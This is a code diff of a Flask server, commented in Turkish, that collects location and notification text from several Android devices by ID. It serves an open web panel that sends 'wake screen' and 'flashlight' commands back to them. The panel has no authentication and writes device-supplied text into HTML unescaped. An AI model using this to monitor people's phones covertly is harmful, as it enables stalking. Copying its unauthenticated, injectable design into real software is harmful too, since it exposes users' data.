@@ -2,58 +2,61 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
-# Sunucu hafızasında verileri tutuyoruz
-data_storage = {
-    "konum": "Konum bekleniyor...",
-    "bildirim": "Bildirim yok...",
-    "komut": "0"  # 0: Bekle, 1: Ekran Aç/Kapat, 2: Feneri Aç
-}
+# Cihazları ID'lerine göre tutuyoruz
+devices = {}
 
-# 1. Android'den gelen konum ve bildirimleri kaydeder
 @app.route('/update', methods=['POST'])
 def update():
+    device_id = request.form.get('device_id', 'Bilinmeyen_Cihaz')
+    
+    if device_id not in devices:
+        devices[device_id] = {"konum": "Bekleniyor...", "bildirim": "Yok...", "komut": "0"}
+    
     if 'lat' in request.form:
-        data_storage["konum"] = request.form.get('lat')
+        devices[device_id]["konum"] = request.form.get('lat')
     if 'bildirim' in request.form:
-        data_storage["bildirim"] = request.form.get('bildirim')
+        devices[device_id]["bildirim"] = request.form.get('bildirim')
+        
     return "OK", 200
 
-# 2. Android'in sürekli kontrol ettiği komut adresi
 @app.route('/get-command', methods=['GET'])
 def get_command():
-    cmd = data_storage["komut"]
-    # Komutu gönderdikten sonra tekrar 0'a çekiyoruz (tek seferlik çalışması için)
-    if cmd != "0":
-        data_storage["komut"] = "0"
-    return cmd
+    device_id = request.args.get('device_id')
+    if device_id in devices:
+        cmd = devices[device_id]["komut"]
+        if cmd != "0":
+            devices[device_id]["komut"] = "0"
+        return cmd
+    return "0"
 
-# 3. Senin komut vereceğin panel
 @app.route('/set-command', methods=['POST'])
 def set_command():
+    device_id = request.form.get('device_id')
     cmd = request.form.get('cmd')
-    if cmd in ["0", "1", "2"]:
-        data_storage["komut"] = cmd
-    return "Komut gönderildi: " + cmd
+    if device_id in devices and cmd in ["0", "1", "2"]:
+        devices[device_id]["komut"] = cmd
+    return f"Komut {cmd} cihaz {device_id} için ayarlandı. <a href='/get-status'>Geri Dön</a>"
 
-# 4. İzleme Paneli
 @app.route('/get-status', methods=['GET'])
 def get_status():
-    return f"""
-    <html>
-    <head><meta charset="UTF-8"><title>Zewnd Kontrol</title></head>
-    <body style="font-family:sans-serif; padding:20px;">
-        <h3>📍 Konum: {data_storage['konum']}</h3>
-        <h3>🔔 Bildirim: {data_storage['bildirim']}</h3>
-        <hr>
-        <h3>⚙️ Kontrol Paneli</h3>
-        <form action="/set-command" method="POST">
-            <button name="cmd" value="1" style="padding:10px;">Ekranı Uyandır</button>
-            <button name="cmd" value="2" style="padding:10px;">Feneri Aç</button>
-            <button name="cmd" value="0" style="padding:10px;">Sıfırla</button>
-        </form>
-    </body>
-    </html>
-    """
+    html = "<html><head><meta charset='UTF-8'><title>Zewnd Kontrol Paneli</title></head><body style='font-family:sans-serif; padding:20px;'>"
+    html += f"<h1>Bağlı Cihaz Sayısı: {len(devices)}</h1>"
+    
+    for d_id, info in devices.items():
+        html += f"""
+        <div style="border:1px solid #ccc; padding:15px; margin-bottom:15px; border-radius:8px;">
+            <h3>Cihaz ID: {d_id}</h3>
+            <p>📍 Konum: {info['konum']}</p>
+            <p>🔔 Bildirim: {info['bildirim']}</p>
+            <form action="/set-command" method="POST">
+                <input type="hidden" name="device_id" value="{d_id}">
+                <button name="cmd" value="1" style="padding:10px;">Ekranı Uyandır</button>
+                <button name="cmd" value="2" style="padding:10px;">Feneri Aç</button>
+            </form>
+        </div>
+        """
+    html += "</body></html>"
+    return html
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
